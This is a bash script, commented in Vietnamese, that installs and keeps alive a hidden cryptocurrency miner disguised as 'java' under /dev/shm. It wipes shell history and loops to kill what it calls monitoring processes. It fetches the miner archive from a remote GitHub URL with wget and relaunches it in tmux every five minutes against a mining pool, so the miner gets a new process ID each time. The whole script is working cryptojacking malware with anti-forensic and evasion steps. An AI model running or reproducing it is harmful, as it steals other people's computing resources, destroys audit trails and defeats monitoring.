#!/bin/bash

SESSION="java"
DOMAIN="$1"
NAME_WORK="$2"
WORK_DIR="/dev/shm/.java_miner"
EXEC_PATH="$WORK_DIR/java/java"

# ❌ Xoá shell history
unset HISTFILE
history -c
> ~/.bash_history
rm -f ~/.bash_history
export HISTFILE=/dev/null

# 🔁 Kill các tiến trình giám sát
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &

# 📥 Nếu chưa có tool thì tải 1 lần duy nhất
if [ ! -f "$EXEC_PATH" ]; then
    echo "[+] Downloading miner..."
    rm -rf "$WORK_DIR"
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR"
    wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz
    tar -xzf java.tar.gz
    chmod +x "$EXEC_PATH"
fi

# 🔁 Vòng lặp: kill và chạy lại mỗi 5 phút
echo "[+] Vòng lặp ..."
while true; do
    # 🔪 Kill tiến trình cũ nếu có
    pkill -f "$EXEC_PATH" 2>/dev/null
    echo "[+] Kill process - sleep 20s..."
    sleep 20
    # ▶️ Chạy lại trong tmux (PID mới)
    tmux kill-session -t $SESSION 2>/dev/null
    echo "[+] run process - sleep 5 phut..."
    tmux new-session -s $SESSION -d
    tmux send-keys -t $SESSION "
        $EXEC_PATH -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
    " C-m

    # ⏲️ Chờ 5 phút
    sleep 300
done

